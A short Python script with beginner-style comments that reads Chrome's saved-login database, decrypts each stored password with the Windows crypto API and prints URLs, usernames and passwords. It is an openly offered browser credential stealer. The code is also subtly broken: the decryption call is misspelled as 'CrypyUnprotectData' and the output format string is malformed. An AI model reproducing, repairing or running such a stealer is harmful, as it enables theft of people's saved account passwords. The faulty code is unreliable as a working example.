import os
import sqlite3 
import win32crypt

def get_chrome(): 
    data_path = "Login Data"
    
    c = sqlite3.connect(data_path)
# connecting to the database through the variable 'c'

    cursor = c.cursor()
    select_statment = 'SELECT origin_url, username_value, password_value FROM Logins'
# here we are using the 'SELECT' statement to get the values 'FROM' another value in the database provided above

    cursor.execute(select_statment)
# this is to execute the SQL query and get the values from the database

    login_data = cursor.fetchall()
# this is to fetch all data from the database

    cred = {}

    string = ''

    for url, user_name, pwd in login_data:
        pwd = win32crypt.CrypyUnprotectData(pwd)
        cred[url] = (user_name, pwd[1].decode('utf8'))
# we have the pwd'[1]' above to index it to 1 because if we don't, we'll get some extra baggage which we don't require for this project
        string += '\n[+] URL:%s USERNAME:%s PASSWORD:%\n' % (url,user_name,pwd[1]. decode('utf8'))
        print(string)

if __name__=='__main__':
    get_chrome()